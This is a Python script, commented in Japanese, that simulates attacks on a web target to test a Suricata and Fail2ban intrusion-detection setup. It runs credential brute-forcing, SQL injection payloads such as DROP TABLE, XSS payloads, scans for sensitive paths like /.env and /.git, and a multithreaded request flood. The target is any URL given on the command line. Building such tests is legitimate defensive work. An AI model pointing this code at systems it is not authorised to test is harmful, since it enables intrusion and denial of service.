#!/usr/bin/env python3
"""
Advanced Attack Simulator for IDS/IPS Testing
攻撃シミュレーションツール - Suricata IPS + Fail2ban システムのテスト用
"""

import requests
import time
import random
import threading
import socket
import subprocess
import sys
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor

class AttackSimulator:
    def __init__(self, target_url="http://localhost:8080"):
        self.target_url = target_url
        self.attack_results = []
        
    def log_result(self, attack_type, status, details=""):
        """攻撃結果をログに記録"""
        result = {
            'time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'attack_type': attack_type,
            'status': status,
            'details': details
        }
        self.attack_results.append(result)
        print(f"[{result['time']}] {attack_type}: {status} - {details}")

    def brute_force_simulation(self, num_attempts=20):
        """ブルートフォース攻撃シミュレーション"""
        print("\n=== ブルートフォース攻撃シミュレーション開始 ===")
        
        usernames = ['admin', 'root', 'user', 'test', 'administrator']
        passwords = ['password', '123456', 'admin', 'root', 'test', 'pass']
        
        for i in range(num_attempts):
            username = random.choice(usernames)
            password = random.choice(passwords)
            
            try:
                # Basic認証での攻撃をシミュレート
                response = requests.get(
                    f"{self.target_url}/admin",
                    auth=(username, password),
                    timeout=5,
                    headers={'User-Agent': 'AttackBot/1.0'}
                )
                
                if response.status_code == 401:
                    self.log_result("BRUTE_FORCE", "BLOCKED", f"{username}:{password}")
                else:
                    self.log_result("BRUTE_FORCE", "SUCCESS", f"{username}:{password}")
                    
            except requests.exceptions.RequestException as e:
                self.log_result("BRUTE_FORCE", "ERROR", str(e))
            
            time.sleep(random.uniform(0.5, 2.0))  # ランダム間隔

    def sql_injection_simulation(self):
        """SQLインジェクション攻撃シミュレーション"""
        print("\n=== SQLインジェクション攻撃シミュレーション開始 ===")
        
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "' UNION SELECT * FROM passwords--",
            "admin'--",
            "' OR 1=1#",
            "1' AND (SELECT COUNT(*) FROM users) > 0--"
        ]
        
        for payload in payloads:
            try:
                params = {'id': payload, 'search': payload}
                response = requests.get(
                    f"{self.target_url}/search",
                    params=params,
                    timeout=5,
                    headers={'User-Agent': 'SQLBot/1.0'}
                )
                self.log_result("SQL_INJECTION", "SENT", f"Payload: {payload[:30]}...")
                
            except requests.exceptions.RequestException as e:
                self.log_result("SQL_INJECTION", "ERROR", str(e))
            
            time.sleep(1)

    def xss_simulation(self):
        """XSS攻撃シミュレーション"""
        print("\n=== XSS攻撃シミュレーション開始 ===")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        for payload in payloads:
            try:
                data = {'comment': payload, 'name': payload}
                response = requests.post(
                    f"{self.target_url}/comment",
                    data=data,
                    timeout=5,
                    headers={'User-Agent': 'XSSBot/1.0'}
                )
                self.log_result("XSS", "SENT", f"Payload: {payload[:30]}...")
                
            except requests.exceptions.RequestException as e:
                self.log_result("XSS", "ERROR", str(e))
            
            time.sleep(1)

    def scanner_simulation(self):
        """ポートスキャン・ディレクトリスキャンシミュレーション"""
        print("\n=== スキャン攻撃シミュレーション開始 ===")
        
        # ディレクトリスキャン
        directories = [
            '/admin', '/backup', '/config', '/database', '/private',
            '/test', '/dev', '/staging', '/debug', '/logs',
            '/.env', '/.git', '/phpMyAdmin', '/wp-admin'
        ]
        
        for directory in directories:
            try:
                response = requests.get(
                    f"{self.target_url}{directory}",
                    timeout=5,
                    headers={'User-Agent': 'Nikto/2.1.6'}
                )
                self.log_result("DIRECTORY_SCAN", "PROBED", f"Path: {directory}")
                
            except requests.exceptions.RequestException as e:
                self.log_result("DIRECTORY_SCAN", "ERROR", str(e))
            
            time.sleep(0.5)

    def malicious_user_agents(self):
        """悪意のあるUser-Agentを使用した攻撃"""
        print("\n=== 悪意のあるUser-Agent攻撃シミュレーション開始 ===")
        
        malicious_agents = [
            'sqlmap/1.0',
            'Nikto/2.1.6',
            'w3af.org',
            'Nmap Scripting Engine',
            'ZmEu',
            'masscan/1.0',
            'DirBuster-1.0',
            '<script>alert(1)</script>'
        ]
        
        for agent in malicious_agents:
            try:
                response = requests.get(
                    self.target_url,
                    timeout=5,
                    headers={'User-Agent': agent}
                )
                self.log_result("MALICIOUS_UA", "SENT", f"UA: {agent}")
                
            except requests.exceptions.RequestException as e:
                self.log_result("MALICIOUS_UA", "ERROR", str(e))
            
            time.sleep(1)

    def dos_simulation(self, duration=30, threads=10):
        """DoS攻撃シミュレーション"""
        print(f"\n=== DoS攻撃シミュレーション開始 ({duration}秒間, {threads}スレッド) ===")
        
        def dos_worker():
            end_time = time.time() + duration
            request_count = 0
            
            while time.time() < end_time:
                try:
                    response = requests.get(
                        self.target_url,
                        timeout=1,
                        headers={'User-Agent': 'DoSBot/1.0'}
                    )
                    request_count += 1
                    
                except requests.exceptions.RequestException:
                    pass  # タイムアウトやエラーは無視
                
                time.sleep(0.01)  # 短い間隔で連続リクエスト
            
            return request_count
        
        # 並列DoS攻撃実行
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(dos_worker) for _ in range(threads)]
            total_requests = sum(future.result() for future in futures)
        
        self.log_result("DOS", "COMPLETED", f"Total requests: {total_requests}")

    def run_all_attacks(self):
        """全ての攻撃をシーケンシャルに実行"""
        print("=== 高度な攻撃シミュレーション開始 ===")
        print(f"ターゲット: {self.target_url}")
        print("警告: これは教育目的のシミュレーションです")
        print()
        
        # 各攻撃を実行
        self.brute_force_simulation(15)
        time.sleep(5)
        
        self.sql_injection_simulation()
        time.sleep(5)
        
        self.xss_simulation()
        time.sleep(5)
        
        self.scanner_simulation()
        time.sleep(5)
        
        self.malicious_user_agents()
        time.sleep(5)
        
        self.dos_simulation(duration=20, threads=5)
        
        # 結果サマリー
        self.print_summary()

    def print_summary(self):
        """攻撃結果のサマリーを表示"""
        print("\n" + "="*60)
        print("攻撃シミュレーション結果サマリー")
        print("="*60)
        
        attack_types = {}
        for result in self.attack_results:
            attack_type = result['attack_type']
            if attack_type not in attack_types:
                attack_types[attack_type] = {'total': 0, 'errors': 0}
            
            attack_types[attack_type]['total'] += 1
            if result['status'] == 'ERROR':
                attack_types[attack_type]['errors'] += 1
        
        for attack_type, stats in attack_types.items():
            success_rate = ((stats['total'] - stats['errors']) / stats['total']) * 100
            print(f"{attack_type:20}: {stats['total']:3}回実行, 成功率: {success_rate:5.1f}%")
        
        print(f"\n総攻撃回数: {len(self.attack_results)}")
        print("\n次のコマンドでシステムの検知状況を確認:")
        print("  sudo fail2ban-client status")
        print("  sudo fail2ban-client status suricata-alerts")
        print("  docker logs suricata_ids | tail -20")


def main():
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = "http://localhost:8080"
    
    print("Advanced IDS/IPS Attack Simulator")
    print("=================================")
    print(f"Target: {target_url}")
    print("\nこのツールは以下の攻撃をシミュレートします:")
    print("- ブルートフォース攻撃")
    print("- SQLインジェクション")
    print("- XSS攻撃")
    print("- ディレクトリスキャン")
    print("- 悪意のあるUser-Agent")
    print("- DoS攻撃")
    print()
    
    response = input("続行しますか? (y/N): ")
    if response.lower() != 'y':
        print("キャンセルされました。")
        return
    
    simulator = AttackSimulator(target_url)
    simulator.run_all_attacks()


if __name__ == "__main__":
    main()
